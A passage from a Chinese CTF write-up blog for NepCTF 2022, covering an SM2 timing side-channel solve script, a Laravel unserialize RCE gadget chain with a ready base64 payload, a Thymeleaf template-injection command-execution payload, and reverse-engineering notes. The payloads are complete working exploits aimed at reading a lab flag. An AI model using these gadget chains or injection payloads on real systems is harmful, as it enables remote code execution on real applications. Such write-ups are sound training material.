class="keyword">or</span> (l2 &lt; len_2):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            X1 = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            Y1 = <span class="built_in">int</span>(P1[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l1 == len_2:</span><br><span class="line">                Z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Z1 = <span class="built_in">int</span>(P1[len_2:], <span class="number">16</span>)</span><br><span class="line">            x2 = <span class="built_in">int</span>(P2[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y2 = <span class="built_in">int</span>(P2[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (Z1 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y2 * Z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x2 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T3 - X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 + X1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 - Y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Z3 = (Z1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (X1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            X3 = (T5 - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (Y1 * T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T4 - X3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            Y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e8</span>):</span><br><span class="line">                sleep(<span class="number">0.1</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (X3, Y3, Z3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_convert_jacb_to_nor</span>(<span class="params">self, Point</span>):</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        x = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">        z = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line">        z_inv = <span class="built_in">pow</span>(</span><br><span class="line">            z, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        z_invSquar = (z_inv * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_invQube = (z_invSquar * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        x_new = (x * z_invSquar) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        y_new = (y * z_invQube) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_new = (z * z_inv) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> z_new == <span class="number">1</span>:</span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">2</span></span><br><span class="line">            <span class="keyword">return</span> form % (x_new, y_new)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_point</span>(<span class="params">self,P1,P2</span>):</span><br><span class="line">        <span class="keyword">if</span> P1==P2:</span><br><span class="line">            <span class="keyword">return</span> self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">return</span> self._convert_jacb_to_nor(self._add_point(P1,P2))</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recvall</span>(<span class="params">self</span>):</span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span><br><span class="line">        msg=msg.encode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.alarm(<span class="number">3600</span>)</span><br><span class="line">        g=ecc_table[<span class="string">&quot;g&quot;</span>]</span><br><span class="line">        O=ecc_table[<span class="string">&quot;O&quot;</span>]</span><br><span class="line">        t=[randint(<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        sk=<span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> t])</span><br><span class="line">        </span><br><span class="line">        self.send(<span class="string">&quot;system reseting...&quot;</span>)</span><br><span class="line">        sm2 = TSM2(sk)</span><br><span class="line">        self.send(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;the system is &quot;</span>+<span class="built_in">str</span>(sm2.pk))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                user=<span class="built_in">int</span>(self.recv(<span class="string">&quot;plz give me your number:&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(<span class="string">&quot;wrong, plz try again&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t1=clock1()</span><br><span class="line">            kG=sm2.kg(sk-user,g)</span><br><span class="line">            t2=clock1()</span><br><span class="line">            self.send(<span class="string">&quot;used &quot;</span>+<span class="built_in">str</span>((t2-t1)/<span class="number">1e9</span>)+<span class="string">&quot; s&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> kG==O:</span><br><span class="line">                f=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">                flag=f.read()</span><br><span class="line">                self.send(flag)</span><br><span class="line">                exit()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></blockquote><p><code>TSM2</code> 类为正常SM2算法实现，只不过在加法运算 <code>_add_point()</code> 和倍乘运算 <code>_double_point()</code> 分别加了 <code>sleep()</code> 控制运算时间。</p><p><code>handle()</code> 处理函数里，给出公钥 $pk$，给100次要求输入 $u$，当满足 $(sk-u)G=O$ 时可拿flag。</p><p>要满足 $(sk-u)G=O$，只有 $sk-u=0$ 或 $sk-u=n$，由于除了公钥和运算总时间无其他输出，只能猜测出 $u=sk$。</p><p>由于 $sk$ 只有8位为1，利用运算总时间，可作为侧信道信息来测试 $sk$ 各位为1时的消耗时间，测试发现当接近正确的“1”位时，运算总时间相较相邻的两位小，那么可使用时间侧信道攻击来求解私钥 $sk$。</p><p>因尝试的总次数最多为100次，采用区间遍历法缩小尝试次数，令 $x$ 为每个区间长度，总次数 $c=\cfrac{254}{x}+8x \le 100$，$x$ 可取值4~8。</p><p>采用 $x=4$ 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;nep.lemonprefect.cn&#x27;</span>,<span class="number">31135</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">pk=r.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(pk)</span><br><span class="line"></span><br><span class="line">nowt = <span class="number">100000.0</span></span><br><span class="line">start = []</span><br><span class="line">startt = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">x</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;used &#x27;</span>)</span><br><span class="line">    time = <span class="built_in">float</span>(r.recvuntil(<span class="string">&#x27; s&#x27;</span>)[:-<span class="number">2</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>,<span class="number">4</span>):</span><br><span class="line">    t = send(<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="built_in">print</span>(i,t)</span><br><span class="line">    <span class="keyword">if</span> t &gt; nowt:</span><br><span class="line">        start.append(i-<span class="number">4</span>)</span><br><span class="line">        <span class="built_in">print</span>(start)</span><br><span class="line">    nowt = t</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(start)</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> start:</span><br><span class="line">    nowt = send(<span class="number">1</span> &lt;&lt; k)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        t = send(<span class="number">1</span> &lt;&lt; (k+<span class="number">1</span>+j))</span><br><span class="line">        <span class="keyword">if</span> t &gt; nowt <span class="keyword">and</span> k+<span class="number">1</span>+j-<span class="number">1</span> &lt;= <span class="number">254</span>:</span><br><span class="line">            ans.append(k+<span class="number">1</span>+j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line">        nowt = t</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">sk = <span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line"><span class="built_in">print</span>(sk)</span><br><span class="line">send(sk)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h3><blockquote><p>顽皮的HRP用Laravel写了个项目来欢迎大伙来玩Nepctf 2nd，没想到…居然被坏蛋Sharun撅了</p></blockquote><p>访问 <code>www.zip</code> 下载源码，CMS为Laravel 9.x。</p><p>在 <code>www\app\Http\Controllers</code> 发现 <code>HelloController.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h3</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&quot;h3&quot;</span>));</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$h3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome Nepctf! GL&amp;HF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化RCE漏洞，使用现成链子可以打通：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Routing</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span>\<span class="title class_">Validator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingResourceRegistration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registrar</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registered</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$controller</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;registrar=<span class="keyword">new</span> <span class="title class_">Validator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=<span class="variable">$cmd</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingResourceRegistration</span>(<span class="string">&#x27;cat /flag&#x27;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Validator</span>&#123;    </span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">extensions</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;extensions[<span class="string">&#x27;&#x27;</span>]=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload：</p><p><code>/hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9</code></p><p>​    </p><h3 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h3><blockquote><p>顽皮的HRP又换了种语言写项目来欢迎大家，没想到又让Sharun掘了😭</p><p>（flag在根目录下: /flag）</p></blockquote><p>用jd-gui反编译 <code>challenger.jar</code> 文件，发现使用了Thymeleaf模板，</p><p>在 <code>HelloController.class</code> 里发现 <code>/eval</code> 路由：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(com.veracode.research.HelloController.class);</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;challenger&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/eval&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123; <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考 <a href="https://www.cnblogs.com/hetianlab/p/13679645.html">Thymeleaf 模板注入导致命令执行</a>，修改payload拿到flag：</p><p>Payload:</p><p><code>/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="快来签到"><a href="#快来签到" class="headerlink" title="快来签到"></a>快来签到</h3><blockquote><p>x86 linux</p></blockquote><p>趣味题。</p><p>IDA打开发现报错 <code>The graph is too big more than 1000 nodes...</code>，且 <code>main()</code> 函数中定义多个图节点，到 IDA - Options - Graph - Max number of nodes 里改一个大数保存，回到 <code>main()</code> 函数切换成Graph overview或者IDA View中缩小，可以看到控制流图（CFG）：</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717213910100.png" alt="image-20220717213910100"></p><p>flag：<code>NepCTF&#123;welc0me_t0_nepctf&#125;</code></p><p>​    </p><h3 id="We-can-gone"><a href="#We-can-gone" class="headerlink" title="We_can_gone"></a>We_can_gone</h3><blockquote><p>是出发的时候了!!!</p></blockquote><p>Go逆向，IDA7.7分析，在String窗口里找到关键字符串交叉引用定位入口函数 <code>sub_4994E0()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int128 <span class="title function_">sub_4994E0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  __int128 result; <span class="comment">// [esp+1Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  sub_4993B0(); <span class="comment">// 输出字符串&quot;Welcome to NepCTF,I gone on the other side&quot;</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  sub_433950();</span><br><span class="line">  runtime_printstring(<span class="string">&quot;please input flag to help you get to the other side:\n&quot;</span>, <span class="number">53</span>);</span><br><span class="line">  sub_4339C0();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xB</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">84</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xC</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xD</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xE</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">69</span>;      <span class="comment">// 定义字符串TRUE</span></span><br><span class="line">  *(_QWORD *)&amp;result = __PAIR64__(v5, (<span class="type">unsigned</span> <span class="type">int</span>)v6);   <span class="comment">// 伪代码混乱</span></span><br><span class="line">  DWORD2(result) = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后半部分伪代码不清晰，在该函数附近发现判断逻辑函数 <code>sub_499630()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 